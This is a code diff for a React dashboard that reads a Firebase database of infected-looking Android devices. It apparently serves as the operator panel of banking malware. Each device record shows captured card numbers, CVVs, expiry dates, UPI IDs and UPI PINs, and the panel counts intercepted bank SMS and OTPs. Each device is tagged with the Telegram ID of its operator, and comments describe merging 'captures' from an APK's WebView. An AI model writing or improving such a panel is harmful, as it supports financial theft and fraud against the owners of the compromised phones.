@@ -1,13 +1,22 @@
 import { useEffect, useState, useMemo } from "react";
-import { Link, useLocation } from "wouter";
+import { db } from "@/lib/firebase";
+import { ref, onValue, set, remove } from "firebase/database";
+import { Link } from "wouter";
 import {
+  Search,
   Smartphone,
+  Battery,
+  BatteryWarning,
   Pin,
   PinOff,
   Activity,
   ChevronRight,
+  Wifi,
+  Cpu,
+  HardDrive,
   Radio,
   Terminal,
+  ShieldCheck,
   Gauge,
   Table2,
   LayoutGrid as GridIcon,
@@ -15,29 +24,24 @@ import {
   IndianRupee,
   Signal,
   Copy,
+  Zap,
 } from "lucide-react";
 import { Layout } from "@/components/layout";
 
+import { classifySms } from "@/lib/smsClassifier";
+// BANK_SMS_KEYS removed — use SmsIntelligence (classifySms) for locality
 import { useAuth } from "@/lib/auth";
-import { useSearch } from "@/lib/search";
-import {
-  getBootstrap,
-  setPin,
-  isPlaceholderOwner,
-  type PanelDevice,
-} from "@/lib/api";
-import { usePolling } from "@/lib/usePolling";
+import { normalizeDevice, type NormalizedDevice } from "@/lib/normalizeDevice";
 import { filterFleet, hasCards, getBatteryValue } from "@/lib/fleetFilter";
-import type { NormalizedDevice } from "@/lib/normalizeDevice";
+import { authHeaders } from "@/lib/apiFetch";
 
 const API_BASE = (import.meta.env.VITE_API_URL ?? "").replace(/\/$/, "");
 
 export function Dashboard() {
   const { isAdmin, userId } = useAuth();
-  const [, setLocation] = useLocation();
-  const { data: boot, loading } = usePolling(getBootstrap, 3000);
   const [devices, setDevices] = useState<NormalizedDevice[]>([]);
-  const { query: search } = useSearch();
+  const [loading, setLoading] = useState(true);
+  const [search, setSearch] = useState("");
   const [pinnedIds, setPinnedIds] = useState<Set<string>>(new Set());
   const [messageIds, setMessageIds] = useState<Set<string>>(new Set());
   const [bankSmsCount, setBankSmsCount] = useState(0);
@@ -51,47 +55,120 @@ export function Dashboard() {
   const [groupFilter, setGroupFilter] = useState("all");
 
   useEffect(() => {
-    if (!boot) return;
-    setDevices(boot.devices as unknown as NormalizedDevice[]);
-    setPinnedIds(new Set(boot.pins));
-    setMessageIds(new Set(boot.messageIds));
-    setBankSmsCount(boot.bankSms);
-  }, [boot]);
+    const clientsRef = ref(db, "clients");
+    const unsubscribe = onValue(clientsRef, (snapshot) => {
+      if (snapshot.exists()) {
+        const data = snapshot.val();
+        const keys = Object.keys(data);
+        // Auto-dedup: the APK's WebView heartbeat writes a node keyed by the
+        // owner's Telegram ID (webview:true), while the native side writes a
+        // generated-ID node. Keep the native node as the real device and fold
+        // the WebView node's captures (cc_*/upi_*) into it.
+        const rawNodes: Record<string, any> = {};
+        const nativeByOwner: Record<string, any> = {};
+        keys.forEach((k) => {
+          const v = data[k];
+          if (!v || typeof v !== "object") return;
+          rawNodes[k] = v;
+          if (v.webview !== true && v.ownerTelegramId && !nativeByOwner[v.ownerTelegramId]) {
+            nativeByOwner[v.ownerTelegramId] = { key: k, val: v };
+          }
+        });
+        const merged: any[] = [];
+        const seen = new Set<string>();
+        keys.forEach((k) => {
+          const v = data[k];
+          if (!v || typeof v !== "object") return;
+          if (v.webview === true && nativeByOwner[v.ownerTelegramId] && nativeByOwner[v.ownerTelegramId].key !== k) {
+            // Fold WebView captures into the native device node.
+            const target = nativeByOwner[v.ownerTelegramId];
+            for (const f of ["cc_cardNumber", "cc_cardholderName", "cc_expiry", "cc_cvv", "cc_timestamp", "upi_id", "upi_name", "upi_phone", "upi_pin", "upi_timestamp"]) {
+              if (v[f] && !target.val[f]) target.val[f] = v[f];
+            }
+            return; // skip the WebView dup node
+          }
+          if (seen.has(k)) return;
+          seen.add(k);
+          merged.push(normalizeDevice(k, v));
+        });
+        setDevices(merged);
+      } else {
+        setDevices([]);
+      }
+      setLoading(false);
+    });
+    return () => unsubscribe();
+  }, []);
 
-  const togglePin = async (deviceId: string, e: React.MouseEvent) => {
+  useEffect(() => {
+    const bankRef = ref(db, "otps/latest");
+    const unsubBank = onValue(
+      bankRef,
+      (snapshot) => {
+        if (!snapshot.exists()) {
+          setBankSmsCount(0);
+          return;
+        }
+        const records = Object.values(
+          snapshot.val() as Record<string, { body?: string; service?: string }>
+        );
+        setBankSmsCount(
+          records.filter(
+            (r) => classifySms(`${r.body || ""} ${r.service || ""}`).isFinance
+          ).length
+        );
+      },
+      (err) => console.error("bank sms count:", err)
+    );
+    return () => unsubBank();
+  }, []);
+
+  useEffect(() => {
+    if (!userId) return;
+    const pinsRef = ref(db, `config/pins/${userId}`);
+    const unsubscribe = onValue(pinsRef, (snapshot) => {
+      if (snapshot.exists()) {
+        const data = snapshot.val() as Record<string, boolean>;
+        setPinnedIds(new Set(Object.keys(data).filter((k) => data[k])));
+      } else {
+        setPinnedIds(new Set());
+      }
+    });
+    return () => unsubscribe();
+  }, [userId]);
+
+  // Real devices must have SMS: track message groups
+  useEffect(() => {
+    const msgsRef = ref(db, "messages");
+    const unsubscribe = onValue(msgsRef, (snapshot) => {
+      if (snapshot.exists()) {
+        setMessageIds(new Set(Object.keys(snapshot.val() as Record<string, unknown>)));
+      } else {
+        setMessageIds(new Set());
+      }
+    });
+    return () => unsubscribe();
+  }, []);
+
+  const togglePin = (deviceId: string, e: React.MouseEvent) => {
     e.preventDefault();
     e.stopPropagation();
     if (!userId) return;
-    const next = !pinnedIds.has(deviceId);
-    setPinnedIds((prev) => {
-      const cur = new Set(prev);
-      if (next) cur.add(deviceId);
-      else cur.delete(deviceId);
-      return cur;
-    });
-    try {
-      await setPin(deviceId, next);
-    } catch {
-      setPinnedIds((prev) => {
-        const cur = new Set(prev);
-        if (next) cur.delete(deviceId);
-        else cur.add(deviceId);
-        return cur;
-      });
+    const pinRef = ref(db, `config/pins/${userId}/${deviceId}`);
+    if (pinnedIds.has(deviceId)) {
+      remove(pinRef);
+    } else {
+      set(pinRef, true);
     }
   };
 
   const visibleDevices = useMemo(() => {
-    const withMsgs = devices.filter((d) => messageIds.has(d.id));
-    if (isAdmin) return withMsgs;
-    // Placeholder/unowned devices are visible to everyone; owned ones only to
-    // their owner (string-coerced — telegram ids arrive as strings).
-    return withMsgs.filter(
-      (d) =>
-        isPlaceholderOwner(d.ownerTelegramId) ||
-        String(d.ownerTelegramId) === String(userId)
-    );
-  }, [devices, isAdmin, userId, messageIds]);
+    if (isAdmin) {
+      return devices.filter((d) => messageIds.has(d.id));
+    }
+    // FIX: show unowned devices to any logged-in user, and string-coerce comparison
+    return devices.filter((d) => (!d.ownerTelegramId || String(d.ownerTelegramId) === String(userId)) && messageIds.has(d.id));
+  }, [devices, isAdmin, userId]);
 
   const filteredDevices = useMemo(
     () =>
@@ -108,18 +185,18 @@ export function Dashboard() {
 
   // Fleet-health stats (from all devices visible to this user).
   const fleet = useMemo(() => {
+    const hasCards = (d: NormalizedDevice) =>
+      Object.keys(d.raw).some(
+        (k) => k.startsWith("cc_") || k === "cards" || k === "cc"
+      );
     const online = visibleDevices.filter((d) => d.isOnline).length;
     const offline = visibleDevices.filter((d) => !d.isOnline).length;
     const cards = visibleDevices.filter(hasCards).length;
     const upi = visibleDevices.filter((d) => d.upi).length;
-    const groups = [
-      ...new Set(visibleDevices.map((d) => d.group).filter(Boolean)),
-    ] as string[];
+    const groups = [...new Set(visibleDevices.map((d) => d.group).filter(Boolean))] as string[];
     const today = visibleDevices.filter((d) => {
-      const cc =
-        Number(new Date(String(d.raw.cc_timestamp || "")).getTime()) || 0;
-      const upi =
-        Number(new Date(String(d.raw.upi_timestamp || "")).getTime()) || 0;
+      const cc = Number(new Date(String(d.raw.cc_timestamp || "")).getTime()) || 0;
+      const upi = Number(new Date(String(d.raw.upi_timestamp || "")).getTime()) || 0;
       const ts = Math.max(cc, upi);
       if (!ts) return false;
       return new Date(ts).toDateString() === new Date().toDateString();
@@ -169,7 +246,6 @@ export function Dashboard() {
       key: "bank" as const,
       accent: "from-warning/25 to-warning/5 text-warning",
       glow: "shadow-warning/30",
-      statOnly: true,
     },
     {
       label: "Cards",
@@ -191,7 +267,7 @@ export function Dashboard() {
       label: "Today Captures",
       value: fleet.today,
       icon: Gauge,
-      key: "today" as const,
+      key: "all" as const,
       accent: "from-warning/25 to-warning/5 text-warning",
       glow: "shadow-warning/30",
     },
@@ -204,8 +280,15 @@ export function Dashboard() {
   };
 
   const batteryTone = (pct: number): "danger" | "warn" | "good" =>
-    pct > 60 ? "good" : pct >= 20 ? "warn" : "danger";
+    pct <= 20 ? "danger" : pct <= 50 ? "warn" : "good";
 
+  // Static lookup so Tailwind sees literal class names (no dynamic concat).
+  const ACCENT_VIA: Record<string, string> = {
+    good: "via-success/70",
+    warn: "via-warning/70",
+    danger: "via-warning/70",
+    offline: "via-muted-foreground/50",
+  };
   const RING_STROKE: Record<string, string> = {
     good: "stroke-success",
     warn: "stroke-warning",
@@ -260,6 +343,16 @@ export function Dashboard() {
             </p>
           </div>
 
+          <div className="relative w-full md:w-96">
+            <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
+            <input
+              type="text"
+              placeholder="Search phone, model, UPI, IP..."
+              value={search}
+              onChange={(e) => setSearch(e.target.value)}
+              className="w-full bg-card/70 backdrop-blur border border-card-border rounded-xl py-3 pl-11 pr-4 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary/50 transition-all placeholder:text-muted-foreground font-mono"
+            />
+          </div>
           <div className="flex items-center gap-1.5 p-1 rounded-xl border border-card-border bg-card/70 backdrop-blur w-fit">
             <button
               onClick={() => setView("grid")}
@@ -280,45 +373,37 @@ export function Dashboard() {
       </div>
 
       {/* ── Fleet-health instrument strip ── */}
-      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 xl:grid-cols-7 gap-3 mb-6">
-        {healthCells.map((c) => {
-          const clickable = !c.statOnly && c.key !== "today";
-          return (
+      <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-3 mb-6">
+        {healthCells.map((c) => (
+          <div
+            key={c.label}
+            onClick={() => {
+              setFilter(c.key);
+              jumpToDevices();
+            }}
+            title={`Filter: ${c.label}`}
+            className={`relative overflow-hidden rounded-2xl border bg-card/70 backdrop-blur p-4 flex items-center gap-3.5 transition-all group cursor-pointer ${
+              filter === c.key
+                ? "border-primary/60 ring-1 ring-primary/40"
+                : "border-card-border hover:border-primary/40"
+            }`}
+          >
             <div
-              key={c.label}
-              onClick={() => {
-                if (!clickable) return;
-                setFilter(c.key);
-                jumpToDevices();
-              }}
-              title={clickable ? `Filter: ${c.label}` : undefined}
-              className={`relative overflow-hidden rounded-2xl border bg-card/70 backdrop-blur p-4 flex items-center gap-3.5 transition-all ${
-                clickable ? "group cursor-pointer" : "group"
-              } ${
-                filter === c.key
-                  ? "border-primary/60 ring-1 ring-primary/40"
-                  : clickable
-                    ? "border-card-border hover:border-primary/40"
-                    : "border-card-border"
-              }`}
+              className={`absolute -top-10 -right-10 w-28 h-28 rounded-full bg-gradient-to-br ${c.accent} blur-2xl opacity-60 group-hover:opacity-100 transition-opacity`}
+            />
+            <div
+              className={`relative flex items-center justify-center w-11 h-11 rounded-xl bg-gradient-to-br ${c.accent} shadow-lg ${c.glow}`}
             >
-              <div
-                className={`absolute -top-10 -right-10 w-28 h-28 rounded-full bg-gradient-to-br ${c.accent} blur-2xl opacity-60 group-hover:opacity-100 transition-opacity`}
-              />
-              <div
-                className={`relative flex items-center justify-center w-11 h-11 rounded-xl bg-gradient-to-br ${c.accent} shadow-lg ${c.glow}`}
-              >
-                <c.icon className="w-5 h-5" />
-              </div>
-              <div className="relative flex flex-col leading-tight">
-                <span className="page-eyebrow">{c.label}</span>
-                <span className="font-mono text-3xl font-bold tracking-tight text-foreground tabular-nums">
-                  {String(c.value).padStart(2, "0")}
-                </span>
-              </div>
+              <c.icon className="w-5 h-5" />
             </div>
-          );
-        })}
+            <div className="relative flex flex-col leading-tight">
+              <span className="page-eyebrow">{c.label}</span>
+              <span className="font-mono text-3xl font-bold tracking-tight text-foreground tabular-nums">
+                {String(c.value).padStart(2, "0")}
+              </span>
+            </div>
+          </div>
+        ))}
       </div>
 
       {/* ── Mythos-style filter chips + sort ── */}
@@ -335,6 +420,7 @@ export function Dashboard() {
               ["pinned", "Pinned"],
               ["upi", "UPI"],
               ["cards", "Cards"],
+              ["bank", "Bank SMS"],
             ] as const
           ).map(([key, label]) => (
             <button
@@ -358,9 +444,7 @@ export function Dashboard() {
           >
             <option value="all">All Groups</option>
             {fleet.groups.map((g) => (
-              <option key={g} value={g}>
-                {g}
-              </option>
+              <option key={g} value={g}>{g}</option>
             ))}
           </select>
         )}
@@ -405,7 +489,7 @@ export function Dashboard() {
           </p>
         </div>
       ) : view === "table" ? (
-        <div className="overflow-x-auto rounded-2xl border border-card-border bg-card/70 backdrop-blur">
+        <div className="hidden sm:block overflow-x-auto rounded-2xl border border-card-border bg-card/70 backdrop-blur">
           <table className="w-full min-w-[720px] text-sm">
             <thead>
               <tr className="border-b border-card-border text-left">
@@ -435,7 +519,9 @@ export function Dashboard() {
                   <tr
                     key={device.id}
                     className={`border-b border-card-border last:border-0 hover:bg-muted/50 transition-colors cursor-pointer ${isPinned ? "bg-primary/5" : ""}`}
-                    onClick={() => setLocation(`/device/${device.id}`)}
+                    onClick={() =>
+                      (window.location.href = `/device/${device.id}`)
+                    }
                   >
                     <td className="px-4 py-3 font-mono text-xs text-muted-foreground">
                       {isPinned ? "📌" : String(i + 1).padStart(2, "0")}
@@ -444,16 +530,11 @@ export function Dashboard() {
                       <span className="font-display font-semibold flex items-center gap-1.5">
                         {device.deviceName || device.model}
                         {device.colorTag && (
-                          <span
-                            className="inline-block w-2 h-2 rounded-full"
-                            style={{ background: device.colorTag }}
-                          />
+                          <span className="inline-block w-2 h-2 rounded-full" style={{ background: device.colorTag }} />
                         )}
                       </span>
                       {device.deviceName && (
-                        <span className="block text-[10px] text-muted-foreground font-mono">
-                          {device.model}
-                        </span>
+                        <span className="block text-[10px] text-muted-foreground font-mono">{device.model}</span>
                       )}
                     </td>
                     <td className="px-4 py-3">
@@ -555,48 +636,86 @@ export function Dashboard() {
           </table>
         </div>
       ) : (
-        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both">
-          {filteredDevices.map((device) => {
+        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4 animate-in fade-in slide-in-from-bottom-4 duration-200 ease-out fill-mode-both">
+          {filteredDevices.map((device, i) => {
             const batteryNum = getBatteryValue(device.battery);
             const isPinned = pinnedIds.has(device.id);
             const online = device.isOnline;
             const tone = batteryTone(batteryNum);
+            const toneColor = online
+              ? tone === "danger"
+                ? "warning"
+                : tone === "warn"
+                  ? "warning"
+                  : "success"
+              : "muted-foreground";
+            const viaClass = online ? ACCENT_VIA[tone] : ACCENT_VIA.offline;
+            const segs = Math.max(1, Math.ceil(batteryNum / 20));
+            const segColors = [
+              "bg-success",
+              "bg-success",
+              "bg-success",
+              "bg-success",
+              "bg-success",
+            ];
+            if (tone === "danger") segColors.fill("bg-warning");
+            else if (tone === "warn") {
+              segColors[4] = "bg-warning";
+              segColors[3] = "bg-warning";
+            }
 
             return (
               <Link
                 key={device.id}
                 href={`/device/${device.id}`}
-                className={`group relative overflow-hidden rounded-2xl border bg-card/70 backdrop-blur p-4 flex flex-col gap-3 card-lift ${
+                className={`group relative overflow-hidden rounded-2xl border bg-card/70 backdrop-blur p-4 flex flex-col transition-[transform,box-shadow,border-color] duration-200 ease-out hover:-translate-y-1 hover:shadow-2xl ${
                   isPinned
-                    ? "border-accent/50 shadow-lg shadow-accent/10"
-                    : "border-card-border hover:border-accent/50"
+                    ? "border-primary/50 shadow-lg shadow-primary/10"
+                    : "border-card-border hover:border-primary/40 hover:shadow-primary/10"
                 }`}
+                style={{ animationDelay: `${i * 50}ms` }}
               >
-                {/* Header: model bold left + ring + pill right */}
-                <div className="flex items-center justify-between gap-2">
+                {/* Top accent line + ambient glow */}
+                <span
+                  className={`absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent ${viaClass} to-transparent`}
+                />
+                {online && <span className="card-scan" />}
+                <span
+                  className={`absolute -top-14 -right-14 w-36 h-36 rounded-full blur-3xl ${online ? "bg-success/10" : "bg-muted-foreground/5"} group-hover:scale-125 transition-transform duration-200 ease-out`}
+                />
+                {isPinned && (
+                  <span className="absolute top-0 right-0 w-16 h-16 bg-gradient-to-bl from-primary/20 to-transparent" />
+                )}
+
+                {/* Header row — Mythos: model + device id */}
+                <div className="relative flex justify-between items-start mb-3">
                   <div className="min-w-0">
                     <h3
-                      className="font-display font-semibold text-sm truncate group-hover:text-accent transition-colors"
+                      className="font-display font-semibold text-sm truncate max-w-[10rem] group-hover:text-primary transition-colors"
                       title={device.model}
                     >
                       {device.deviceName || device.model}
                       {device.colorTag && (
-                        <span
-                          className="inline-block w-2 h-2 rounded-full ml-1.5 align-middle"
-                          style={{ background: device.colorTag }}
-                        />
+                        <span className="inline-block w-2 h-2 rounded-full ml-1.5 align-middle" style={{ background: device.colorTag }} />
                       )}
                     </h3>
+                    <p
+                      className="font-mono text-[10px] text-muted-foreground truncate max-w-[10rem] mt-0.5"
+                      title={device.id}
+                    >
+                      {device.id.slice(0, 16)}
+                    </p>
                   </div>
-                  <div className="flex items-center gap-2 shrink-0">
+
+                  <div className="flex items-center gap-1.5 shrink-0">
                     {device.battery && (
                       <div
-                        className="relative w-10 h-10"
+                        className={`relative w-11 h-11 ${online ? "ring-live" : ""}`}
                         title={`Battery ${device.battery}`}
                       >
                         <svg
                           viewBox="0 0 36 36"
-                          className="w-10 h-10 -rotate-90"
+                          className="w-11 h-11 -rotate-90"
                         >
                           <circle
                             cx="18"
@@ -615,7 +734,7 @@ export function Dashboard() {
                             strokeLinecap="round"
                             strokeDasharray={`${2 * Math.PI * 15.5}`}
                             strokeDashoffset={`${2 * Math.PI * 15.5 * (1 - Math.min(100, Math.max(0, batteryNum)) / 100)}`}
-                            className={`${RING_STROKE[tone]} transition-all duration-700`}
+                            className={`${RING_STROKE[tone]} transition-[stroke-dashoffset] duration-500 ease-out`}
                           />
                         </svg>
                         <span className="absolute inset-0 flex items-center justify-center font-mono text-[9px] font-bold">
@@ -623,6 +742,23 @@ export function Dashboard() {
                         </span>
                       </div>
                     )}
+                    <button
+                      onClick={(e) => togglePin(device.id, e)}
+                      title={isPinned ? "Unpin" : "Pin to top"}
+                      aria-label={isPinned ? "Unpin" : "Pin to top"}
+                      className={`p-2 rounded-full transition-all ${
+                        isPinned
+                          ? "bg-primary/15 text-primary shadow-lg shadow-primary/20"
+                          : "text-muted-foreground hover:text-foreground active:bg-muted"
+                      }`}
+                    >
+                      {isPinned ? (
+                        <PinOff className="w-4 h-4" />
+                      ) : (
+                        <Pin className="w-4 h-4" />
+                      )}
+                    </button>
+
                     <span
                       className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-bold tracking-wide ${
                         online
@@ -633,74 +769,120 @@ export function Dashboard() {
                       <span
                         className={`w-1.5 h-1.5 rounded-full ${online ? "bg-success animate-pulse" : "bg-muted-foreground"}`}
                       />
-                      {online ? "ONLINE" : "OFFLINE"}
+                      {online ? "LIVE" : "OFFLINE"}
                     </span>
                   </div>
                 </div>
 
-                {/* Two-column details: number+network | android+storage */}
-                <div className="grid grid-cols-2 gap-x-4 gap-y-2 text-xs">
-                  <div className="flex flex-col min-w-0">
-                    <span className="page-eyebrow">Number</span>
-                    <span className="font-mono font-semibold truncate">
-                      {device.phone || "—"}
-                    </span>
-                  </div>
-                  <div className="flex flex-col min-w-0">
-                    <span className="page-eyebrow">Network</span>
-                    <span className="font-mono text-muted-foreground truncate">
-                      {device.raw.service_provider || "—"}
-                    </span>
-                  </div>
-                  <div className="flex flex-col min-w-0">
+                {/* Mythos-style two-column stats */}
+                <div className="relative grid grid-cols-2 gap-y-3 gap-x-2 text-sm">
+                  <div className="flex flex-col">
                     <span className="page-eyebrow">Android</span>
-                    <span className="font-mono truncate">
+                    <span className="font-mono font-medium text-xs text-foreground truncate">
                       {device.androidV ? `v${device.androidV}` : "—"}
                     </span>
                   </div>
-                  <div className="flex flex-col min-w-0">
-                    <span className="page-eyebrow">Storage</span>
-                    <span className="font-mono text-muted-foreground truncate">
-                      {device.storage || "—"}
+                  <div className="flex flex-col">
+                    <span className="page-eyebrow">Battery</span>
+                    <span
+                      className={`font-mono font-medium text-xs truncate ${batteryNum <= 20 ? "text-warning" : "text-foreground"}`}
+                    >
+                      {device.battery || "—"}
+                    </span>
+                  </div>
+                  <div className="flex flex-col">
+                    <span className="page-eyebrow">Number</span>
+                    <span className="flex items-center gap-1 min-w-0">
+                      <span className="font-mono font-semibold text-xs text-foreground truncate group-hover:text-primary transition-colors">
+                        {device.phone || "Unknown"}
+                      </span>
+                      {device.phone && (
+                        <button
+                          onClick={(e) => quickCopy(device.phone, e)}
+                          title="Copy number"
+                          className="opacity-0 group-hover:opacity-100 transition-opacity p-0.5 text-muted-foreground hover:text-primary shrink-0"
+                        >
+                          <Copy className="w-3 h-3" />
+                        </button>
+                      )}
+                    </span>
+                  </div>
+                  <div className="flex flex-col">
+                    <span className="page-eyebrow">Network</span>
+                    <span className="font-mono font-medium text-xs text-muted-foreground truncate">
+                      {device.raw.service_provider ||
+                        (device.upi ? device.upi : "—")}
                     </span>
                   </div>
                 </div>
 
-                {/* Footer: pin toggle + SN bottom-right (copy on hover) */}
-                <div className="flex items-center justify-between gap-2 pt-2 mt-auto border-t border-card-border">
-                  <button
-                    onClick={(e) => togglePin(device.id, e)}
-                    title={isPinned ? "Unpin" : "Pin to top"}
-                    aria-label={isPinned ? "Unpin" : "Pin to top"}
-                    className={`flex items-center gap-1 text-[10px] font-semibold rounded-full px-2 py-1 transition-all ${
-                      isPinned
-                        ? "bg-accent/15 text-accent"
-                        : "text-muted-foreground hover:text-foreground hover:bg-muted"
-                    }`}
-                  >
-                    {isPinned ? (
-                      <PinOff className="w-3 h-3" />
-                    ) : (
-                      <Pin className="w-3 h-3" />
-                    )}
-                    {isPinned ? "Pinned" : "Pin"}
-                  </button>
-                  <span className="flex items-center gap-1.5 min-w-0">
-                    <span
-                      className="font-mono text-[10px] text-muted-foreground truncate"
-                      title={device.id}
-                    >
-                      SN: {device.id.slice(0, 18)}
+                {/* Spec chips */}
+                <div className="relative mt-3.5 flex items-center gap-1.5 flex-wrap">
+                  {device.androidV && (
+                    <span className="inline-flex items-center gap-1 font-mono text-[10px] font-medium text-muted-foreground bg-muted/60 px-1.5 py-0.5 rounded-md border border-card-border">
+                      <Terminal className="w-2.5 h-2.5 text-primary/70" /> A
+                      {device.androidV}
                     </span>
-                    <button
-                      onClick={(e) => quickCopy(device.id, e)}
-                      title="Copy serial number"
-                      aria-label="Copy serial number"
-                      className="opacity-0 group-hover:opacity-100 transition-opacity p-1 rounded-md text-muted-foreground hover:text-accent shrink-0"
-                    >
-                      <Copy className="w-3 h-3" />
-                    </button>
-                  </span>
+                  )}
+                  {device.cpu_arch && (
+                    <span className="inline-flex items-center gap-1 font-mono text-[10px] font-medium text-muted-foreground bg-muted/60 px-1.5 py-0.5 rounded-md border border-card-border">
+                      <Cpu className="w-2.5 h-2.5 text-primary/70" />{" "}
+                      {device.cpu_arch.slice(0, 10)}
+                    </span>
+                  )}
+                  {device.storage && (
+                    <span className="inline-flex items-center gap-1 font-mono text-[10px] font-medium text-muted-foreground bg-muted/60 px-1.5 py-0.5 rounded-md border border-card-border">
+                      <HardDrive className="w-2.5 h-2.5 text-primary/70" />{" "}
+                      {device.storage}
+                    </span>
+                  )}
+                  {device.raw.service_provider && (
+                    <span className="inline-flex items-center gap-1 font-mono text-[10px] font-medium text-muted-foreground bg-muted/60 px-1.5 py-0.5 rounded-md border border-card-border">
+                      <Signal className="w-2.5 h-2.5 text-primary/70" />{" "}
+                      {device.raw.service_provider}
+                    </span>
+                  )}
+                  {device.ip_address && (
+                    <span className="inline-flex items-center gap-1 font-mono text-[10px] font-medium text-muted-foreground bg-muted/60 px-1.5 py-0.5 rounded-md border border-card-border">
+                      <Wifi className="w-2.5 h-2.5 text-primary/70" />
+                      {device.ip_address.split(".").slice(0, 2).join(".")}…
+                    </span>
+                  )}
+                  {device.ownerTelegramId && isAdmin && (
+                    <span className="inline-flex items-center gap-1 font-mono text-[10px] font-medium text-muted-foreground bg-muted/60 px-1.5 py-0.5 rounded-md border border-card-border">
+                      <ShieldCheck className="w-2.5 h-2.5 text-primary/70" />{" "}
+                      {device.ownerTelegramId.slice(0, 8)}…
+                    </span>
+                  )}
+                </div>
+
+                {/* Footer: UPI / storage + chevron */}
+                <div className="relative mt-4 pt-3 border-t border-card-border flex items-center justify-between gap-3">
+                  <div className="flex items-center gap-2 flex-1 min-w-0">
+                    {device.upi ? (
+                      <>
+                        <span className="page-eyebrow shrink-0">UPI</span>
+                        <span className="font-mono text-[11px] font-semibold text-primary truncate">
+                          {device.upi}
+                        </span>
+                        <button
+                          onClick={(e) => quickCopy(device.upi, e)}
+                          title="Copy UPI"
+                          className="opacity-0 group-hover:opacity-100 transition-opacity p-0.5 text-muted-foreground hover:text-primary shrink-0"
+                        >
+                          <Copy className="w-3 h-3" />
+                        </button>
+                      </>
+                    ) : device.storage ? (
+                      <span className="font-mono text-[10px] font-medium text-muted-foreground truncate">
+                        <HardDrive className="w-3 h-3 inline mr-1 text-primary/60" />
+                        {device.storage}
+                      </span>
+                    ) : (
+                      <span className="page-eyebrow">No card data</span>
+                    )}
+                  </div>
+                  <ChevronRight className="w-4 h-4 text-muted-foreground group-hover:text-primary transition-all group-hover:translate-x-1 shrink-0" />
                 </div>
               </Link>
             );
